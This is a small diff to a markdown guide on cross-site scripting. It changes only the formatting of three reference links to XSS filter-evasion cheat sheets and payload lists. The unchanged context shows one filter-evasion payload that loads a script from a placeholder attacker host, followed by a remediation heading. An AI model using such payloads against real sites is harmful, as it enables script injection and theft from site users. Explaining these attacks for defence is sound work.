@@ -65,9 +65,9 @@ Filters are based on a blacklist, they could not block every type of expressions
 http://example/?var=<SRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>
 ```
 
-> https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet (XSS Filter Evasion Cheat Sheet)
-> https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
-> https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
+   - https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet (XSS Filter Evasion Cheat Sheet)
+   - https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt
+   - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection
 
 ## XSS - Remediation     
 ### Server-Side Validation
